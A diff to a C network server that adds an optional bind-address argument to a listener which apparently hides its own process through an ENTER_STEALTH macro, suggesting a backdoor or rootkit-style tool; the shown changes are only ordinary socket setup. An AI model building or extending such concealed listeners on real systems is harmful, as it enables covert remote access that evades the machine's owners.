@@ -12,12 +12,13 @@ int main(int argc, char** argv)
 {
     int port, sockfd, new_sockfd;
     struct sockaddr_in host_addr, client_addr;
+    struct in_addr addr;
     socklen_t sin_size;
     pid_t pid;
     int yes = 1;
 
-    if (argc != 2) {
-        fprintf(stderr, "USAGE: %s <port>\n", argv[0]);
+    if (argc < 2 || argc > 3) {
+        fprintf(stderr, "USAGE: %s <port> [ip-address]\n", argv[0]);
         return EXIT_FAILURE;
     }
 
@@ -25,6 +26,15 @@ int main(int argc, char** argv)
     if(ENTER_STEALTH(pid)) {
         fprintf(stderr, "Failed to acquire stealth\n");
         return EXIT_FAILURE;
+    }
+
+    if (argc != 3 || !inet_aton(argv[2], &addr)) {
+        addr.s_addr = 0;
+        if (argc == 3) {
+            fprintf(stderr, "Bad address, using default\n");
+        } else {
+            DEBUG_PRINT("No address specified, defaulting to local host\n");
+        }
     }
 
     int length = strlen(argv[1]);
@@ -54,7 +64,7 @@ int main(int argc, char** argv)
     host_addr.sin_family = AF_INET;
     host_addr.sin_port = htons(port);
     // Automatically use my IP
-    host_addr.sin_addr.s_addr = 0;
+    host_addr.sin_addr = addr;
     memset(&(host_addr.sin_zero), '\0', 8);
 
     if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1) {
